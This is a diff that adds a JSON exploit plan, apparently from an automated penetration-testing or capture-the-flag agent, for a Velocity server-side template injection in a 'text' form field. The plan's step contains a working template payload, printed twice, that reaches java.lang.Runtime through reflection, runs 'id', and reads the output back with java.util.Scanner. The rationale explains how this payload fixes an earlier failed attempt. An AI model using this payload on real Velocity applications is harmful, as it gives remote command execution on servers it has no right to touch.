@@ -1,0 +1,62 @@
+{
+  "version": 1,
+  "plan_id": "velocity-ssti-rce-scanner-fix",
+  "vuln_summary": "Velocity SSTI in 'text' parameter allows RCE. Previous attempts failed at reading command output due to BufferedReader constructor incompatibility. Switch to java.util.Scanner.",
+  "rationale": "The SSTI execution primitive is confirmed. The failure is specifically in the output reading mechanism. Using java.util.Scanner with useDelimiter('\\\\A').next() will read the entire InputStream as a string, avoiding the incompatible BufferedReader constructor.",
+  "chain_design": "ssti_reflection -> ssti_execution -> command_execution",
+  "steps": [
+    {
+      "id": 1,
+      "status": "PLANNED",
+      "type": "python",
+      "purpose": "Execute 'id' command via Velocity SSTI and capture output using java.util.Scanner",
+      "expected_outcome": "HTTP 200 response containing 'uid=' in the body",
+      "depends_on": [],
+      "on_failure": "BLOCK_AND_DEBUG",
+      "why_this_step_advances_state": "This step directly attempts to achieve command execution with output capture, moving from ssti_execution to command_execution primitive.",
+      "why_this_payload_is_a_mutation": "Replaces the failed BufferedReader approach with java.util.Scanner, which has a constructor accepting InputStream and provides a next() method to read the full stream.",
+      "why_this_is_not_regression": "The payload still uses the confirmed working Runtime.exec chain, only the output reading mechanism is changed.",
+      "target_primitive": "command_execution",
+      "why_this_primitive_advances_chain": "command_execution is a direct progression from ssti_execution and enables file read and flag retrieval.",
+      "sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($e=\"id\")#set($c=$e.getClass().forName('java.lang.Runtime'))#set($r=$c.getRuntime())#set($p=$r.exec($e))#set($in=$p.getInputStream())#set($sc=$in.getClass().forName('java.util.Scanner').getConstructor($in.getClass()).newInstance($in))#set($out=$sc.useDelimiter('\\A').next())$out"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_imports": [],
+      "_ast_sdk_calls": [
+        {
+          "primitive": "HttpClient.post",
+          "target": "/",
+          "body": {
+            "text": "#set($e=\"id\")#set($c=$e.getClass().forName('java.lang.Runtime'))#set($r=$c.getRuntime())#set($p=$r.exec($e))#set($in=$p.getInputStream())#set($sc=$in.getClass().forName('java.util.Scanner').getConstructor($in.getClass()).newInstance($in))#set($out=$sc.useDelimiter('\\A').next())$out"
+          },
+          "body_format": "form"
+        }
+      ],
+      "_ast_valid": true
+    }
+  ],
+  "history_state": {
+    "rounds": 14,
+    "state": "gadget_triggered",
+    "chain": [
+      "init",
+      "payload_injected",
+      "probe_success"
+    ]
+  },
+  "primitive_context": {
+    "current_primitive": "ssti_execution",
+    "confirmed_primitives": [
+      "ssti_execution"
+    ],
+    "target_primitive": "command_execution"
+  },
+  "platform": "Windows"
+}
